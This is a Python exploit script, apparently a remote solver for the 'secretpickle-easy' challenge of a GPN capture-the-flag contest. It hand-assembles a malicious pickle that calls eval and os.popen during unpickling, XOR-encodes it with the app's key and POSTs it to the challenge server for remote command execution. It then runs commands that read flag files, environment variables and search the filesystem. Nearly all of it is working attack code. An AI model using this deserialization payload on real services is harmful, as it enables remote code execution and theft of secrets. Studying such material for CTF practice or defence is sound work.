#!/usr/bin/env python3
# Exploit for secretpickle-easy remote
# Target default: https://butter-basted-fish-fingers-on-compressed-truffle-oil-pfl9.gpn24.ctf.kitctf.de

import argparse
import base64
import pickle
import re
import ssl
import sys
import urllib.error
import urllib.request

TARGET = "https://butter-basted-fish-fingers-on-compressed-truffle-oil-pfl9.gpn24.ctf.kitctf.de"

# From app/secretpickle.py
PREFIX = bytes.fromhex("8004 950000000000000000 7d 94 28")
KEY = bytes.fromhex("77c07f8fd2ae7ad9f5aabc008c79d0d3")
FLAG_RE = re.compile(r"GPNCTF\{[^}\r\n]+\}")


def xor_repeating(data: bytes, key: bytes = KEY) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def secretpickle_encode_suffix(suffix: bytes) -> str:
    # Server appends PREFIX before XOR-decoded input, so we only send the suffix.
    return base64.b64encode(xor_repeating(suffix)).decode()


def secretpickle_decode_response(encoded: str):
    raw = PREFIX + xor_repeating(base64.b64decode(encoded))
    return pickle.loads(raw)


def pstr(s: str) -> bytes:
    b = s.encode()
    if len(b) < 256:
        return b"\x8c" + bytes([len(b)]) + b  # SHORT_BINUNICODE
    return b"X" + len(b).to_bytes(4, "little") + b  # BINUNICODE


def build_payload(command: str) -> str:
    """
    Makes this object while unpickling:
      {
        'action': 'hello',
        'params': {
          'name': builtins.eval("__import__('os').popen(<command>).read()")
        }
      }

    REDUCE executes eval during pickle.loads(); then /hello returns:
      Hello, <command output>!
    """
    expr = "__import__('os').popen(%r).read()" % command
    suffix = b"".join([
        pstr("action"), pstr("hello"),
        pstr("params"), b"}", b"(", pstr("name"),
        pstr("builtins"), pstr("eval"), b"\x93",  # STACK_GLOBAL
        pstr(expr), b"\x85", b"R",                # TUPLE1, REDUCE
        b"u",                                      # SETITEMS: params dict
        b"u",                                      # SETITEMS: top-level dict
        b".",                                      # STOP
    ])
    return secretpickle_encode_suffix(suffix)


def post_payload(base_url: str, payload: str, timeout: int = 20, insecure: bool = False):
    url = base_url.rstrip("/") + "/" + payload
    req = urllib.request.Request(url, data=b"", method="POST")
    ctx = None
    if insecure and url.startswith("https://"):
        ctx = ssl._create_unverified_context()
    with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
        body = r.read().decode(errors="replace")
        status = getattr(r, "status", None)
    return status, body


def extract_command_output(decoded):
    if not isinstance(decoded, dict):
        return ""
    result = decoded.get("result", "")
    if not isinstance(result, str):
        return ""
    # Normal response is exactly-ish: "Hello, <output>!"
    if result.startswith("Hello, "):
        out = result[len("Hello, "):]
        if out.endswith("!"):
            out = out[:-1]
        return out
    return result


def run_command(base_url: str, command: str, timeout: int, insecure: bool):
    payload = build_payload(command)
    status, encoded_body = post_payload(base_url, payload, timeout=timeout, insecure=insecure)
    decoded = secretpickle_decode_response(encoded_body)
    output = extract_command_output(decoded)
    return {
        "status": status,
        "payload": payload,
        "encoded_body": encoded_body,
        "decoded": decoded,
        "output": output,
    }


def main():
    ap = argparse.ArgumentParser(description="Remote solver for secretpickle-easy")
    ap.add_argument("base_url", nargs="?", default=TARGET)
    ap.add_argument("--cmd", help="Run one command instead of auto flag search")
    ap.add_argument("--timeout", type=int, default=20)
    ap.add_argument("--insecure", action="store_true", help="Disable TLS certificate verification")
    ap.add_argument("--verbose", "-v", action="store_true")
    args = ap.parse_args()

    commands = [args.cmd] if args.cmd else [
        "cat /flag.txt 2>/dev/null",
        "cat /flag 2>/dev/null",
        "cat flag.txt 2>/dev/null",
        "cat app/flag.txt 2>/dev/null",
        "python3 -c 'import os; print(os.environ.get(\"FLAG\", \"\"))' 2>/dev/null",
        "find / -maxdepth 4 -type f \\( -iname '*flag*' -o -name 'proof.txt' \\) -exec sh -c 'for f do echo ===$f===; cat \"$f\"; echo; done' sh {} + 2>/dev/null | head -c 6000",
    ]

    print(f"[+] target: {args.base_url.rstrip('/')}")

    last_error = None
    for i, cmd in enumerate(commands, 1):
        print(f"\n[{i}/{len(commands)}] command: {cmd}")
        try:
            res = run_command(args.base_url, cmd, timeout=args.timeout, insecure=args.insecure)
        except (urllib.error.URLError, urllib.error.HTTPError, TimeoutError, ssl.SSLError, OSError) as e:
            last_error = e
            print(f"[-] request failed: {type(e).__name__}: {e}")
            continue
        except Exception as e:
            last_error = e
            print(f"[-] exploit/decode failed: {type(e).__name__}: {e}")
            continue

        print(f"[+] HTTP status: {res['status']}")
        print(f"[+] decoded response: {res['decoded']!r}")
        print("[+] command output:")
        print(res["output"] if res["output"] else "<empty>")

        m = FLAG_RE.search(res["output"])
        if m:
            print(f"\n[+] FLAG FOUND: {m.group(0)}")
            print("[+] proof: flag appeared in command output returned by the vulnerable server response")
            return 0

    if last_error:
        print(f"\n[-] no flag found; last error: {type(last_error).__name__}: {last_error}")
    else:
        print("\n[-] no GPNCTF{...} flag found in command outputs")
    return 1


if __name__ == "__main__":
    sys.exit(main())
